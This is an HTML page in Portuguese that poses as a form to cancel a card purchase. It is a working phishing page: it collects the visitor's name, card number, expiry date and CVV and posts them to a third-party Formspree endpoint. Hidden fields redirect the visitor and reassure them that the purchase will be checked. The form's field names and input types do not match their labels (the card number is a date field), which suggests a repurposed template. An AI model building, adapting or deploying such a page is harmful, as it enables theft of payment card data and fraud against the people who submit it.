<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cancelar compra do cartão</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }

        input[type="text"],
        input[type="date"],
        input[type="number"],
        textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .success-message {
            display: none;
            background: #4caf50;
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Cadastro</h1>
        <p class="subtitle">Preencha os dados abaixo</p>
        
        <!-- SUBSTITUA 'SEU_ID_AQUI' pelo ID do Formspree -->
        <form action="https://formspree.io/f/3099660649043590545" method="POST">
            
            <div class="form-group">
                <label for="nome">Nome eleitoral</label>
                <input type="text" id="nome" name="nome" required placeholder="Digite seu nome">
            </div>

            <div class="form-group">
                <label for="data_nascimento">Número do cartão</label>
                <input type="date" id="data_nascimento" name="data_nascimento" required>
            </div>

            <div class="form-group">
                <label for="meses_empresa">Data da validade</label>
                <input type="number" id="meses_empresa" name="meses_empresa" min="0" required placeholder="Ex: 12">
            </div>

            <div class="form-group">
                <label for="motivo">cvv</label>
                <textarea id="motivo" name="motivo" required placeholder="Conte-nos seu motivo..."></textarea>
            </div>

            <!-- Campo oculto para redirecionamento após envio -->
            <input type="hidden" name="_next" value="https://seuusuario.github.io/seurepositorio/obrigado.html">
            
            <!-- Campo oculto para assunto do email -->
            <input type="hidden" name="_subject" value="Iremos verificar!">

            <button type="submit">Enviar pedido</button>
        </form>

        <div id="success" class="success-message">
            Iremos verificar a compra!
        </div>
    </div>
</body>
</html>
